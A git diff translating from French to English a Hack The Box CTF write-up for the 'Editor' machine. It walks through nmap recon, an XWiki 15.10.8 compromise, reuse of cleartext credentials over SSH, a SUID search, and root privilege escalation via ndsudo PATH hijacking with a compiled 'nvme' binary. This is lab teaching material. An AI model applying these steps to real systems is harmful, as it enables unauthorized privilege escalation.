@@ -1,67 +1,67 @@
 # CTF – Editor (Writeup)
 
-## Contexte
+## Context
 
-Dans ce challenge Hack The Box, je cible une machine exposant plusieurs services web.  
-L’objectif est d’obtenir un accès initial, puis d’escalader mes privilèges jusqu’à devenir **root**.
+In this Hack The Box challenge I target a machine exposing several web services.  
+The goal is to get initial access, then escalate privileges up to **root**.
 
 ---
 
-## Reconnaissance
+## Recon
 
-Je commence par un scan Nmap afin d’identifier les services exposés :
+I start with an Nmap scan to identify the exposed services:
 
     nmap -sC -sS -sV 10.10.11.80
 
-Le scan révèle :
-- un service HTTP sur le port 80
-- un service HTTP sur le port 8080
+The scan shows:
+- an HTTP service on port 80
+- an HTTP service on port 8080
 
-En accédant au port 8080, j’identifie une instance **XWiki** (version 15.10.8).
+Hitting port 8080, I find an **XWiki** instance (version 15.10.8).
 
 ---
 
-## Accès initial – Exploitation XWiki
+## Initial access – XWiki exploitation
 
-La version XWiki 15.10.8 est vulnérable à une faille permettant d’obtenir un accès au serveur XWiki.
+XWiki 15.10.8 is vulnerable to a flaw that gives access to the XWiki server.
 
-Après exploitation, je fouille les fichiers de configuration présents sur le serveur et découvre des identifiants stockés en clair.
+After exploiting it, I dig through the config files on the server and find credentials stored in cleartext.
 
-Je récupère les credentials suivants :
+I recover these credentials:
 
-- Utilisateur : oliver  
-- Mot de passe : t********9  
+- User: oliver  
+- Password: t********9  
 
-Je peux alors me connecter en SSH :
+I can then log in over SSH:
 
     ssh oliver@10.10.11.80
 
 ---
 
-## Énumération locale
+## Local enumeration
 
-Une fois connecté en tant que `oliver`, je commence par transférer **linPEAS** afin d’automatiser l’énumération.
+Once logged in as `oliver`, I transfer **linPEAS** to automate the enumeration.
 
-Depuis ma machine :
+From my machine:
 
     scp ./linpeas.sh oliver@10.10.11.80:/tmp/
 
-Puis sur la machine cible :
+Then on the target:
 
     chmod +x /tmp/linpeas.sh
     /tmp/linpeas.sh
 
-L’outil ne révèle rien d’évident immédiatement. Je décide donc de rechercher manuellement les binaires SUID appartenant à root.
+The tool doesn't surface anything obvious right away. So I decide to look manually for SUID binaries owned by root.
 
 ---
 
-## Recherche de binaires SUID
+## Looking for SUID binaries
 
-Je lance la commande suivante :
+I run:
 
     find / -user root -perm -4000 -print 2>/dev/null
 
-Résultat notable :
+Notable result:
 
     /opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
     /opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
@@ -84,68 +84,68 @@ Résultat notable :
     /usr/lib/openssh/ssh-keysign
     /usr/libexec/polkit-agent-helper-1
 
-Un élément attire mon attention : **ndsudo**, un plugin lié à **Netdata**.
+One thing stands out: **ndsudo**, a plugin tied to **Netdata**.
 
 ---
 
-## Analyse de ndsudo
+## Looking at ndsudo
 
-Après recherche, je découvre qu’il existe un **PoC public** exploitant `ndsudo`.  
-L’utilisateur `oliver` fait partie du groupe **netdata**, ce qui rend l’exploitation possible.
+After some research, I find there's a **public PoC** that exploits `ndsudo`.  
+The `oliver` user belongs to the **netdata** group, which makes the exploitation possible.
 
-Le principe de l’attaque repose sur un détournement de binaire appelé par `ndsudo`.
+The attack relies on hijacking a binary that `ndsudo` calls.
 
 ---
 
-## Escalade de privilèges via ndsudo
+## Privilege escalation via ndsudo
 
-Je récupère un code C public depuis GitHub et je le compile sur ma machine sous le nom `nvme`.
+I grab public C code from GitHub and compile it on my machine as `nvme`.
 
-Sur ma machine :
+On my machine:
 
     gcc exploit.c -o nvme
 
-Je transfère ensuite le binaire sur la machine cible :
+I then transfer the binary to the target:
 
     scp nvme oliver@10.10.11.80:/tmp/nvme
 
-Sur la machine cible :
+On the target:
 
     chmod +x /tmp/nvme
     export PATH=/tmp:$PATH
 
-Je lance ensuite la commande vulnérable :
+Then I run the vulnerable command:
 
     /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
 
-Grâce à la manipulation du PATH et à l’appel de `ndsudo`, le binaire est exécuté avec les privilèges **root**.
+Thanks to the PATH manipulation and the `ndsudo` call, the binary runs with **root** privileges.
 
-Je deviens alors directement **root** sur la machine.
+I become **root** on the machine directly.
 
 ---
 
 ## Conclusion
 
-Ce challenge met en évidence :
-- les risques liés aux applications web vulnérables (XWiki)
-- le danger des identifiants stockés en clair
-- l’importance des groupes système mal configurés
-- l’impact critique de binaires SUID exploitables comme `ndsudo`
+This challenge shows:
+- the risk of vulnerable web apps (XWiki)
+- the danger of credentials stored in cleartext
+- why misconfigured system groups matter
+- the critical impact of exploitable SUID binaries like `ndsudo`
 
-L’exploitation combine :
-- compromission applicative
-- récupération de credentials
-- accès SSH
-- escalade de privilèges via un plugin Netdata vulnérable
+The exploitation combines:
+- application compromise
+- credential recovery
+- SSH access
+- privilege escalation through a vulnerable Netdata plugin
 
 ---
 
-## Compétences démontrées
+## Skills demonstrated
 
-- Reconnaissance réseau (Nmap)
-- Exploitation de CMS vulnérable (XWiki)
-- Recherche et exploitation de credentials
-- Énumération locale Linux
-- Analyse de binaires SUID
-- Exploitation de PoC publics
-- Escalade de privilèges via détournement de PATH
+- Network recon (Nmap)
+- Exploiting a vulnerable CMS (XWiki)
+- Finding and using credentials
+- Linux local enumeration
+- SUID binary analysis
+- Using public PoCs
+- Privilege escalation through PATH hijacking
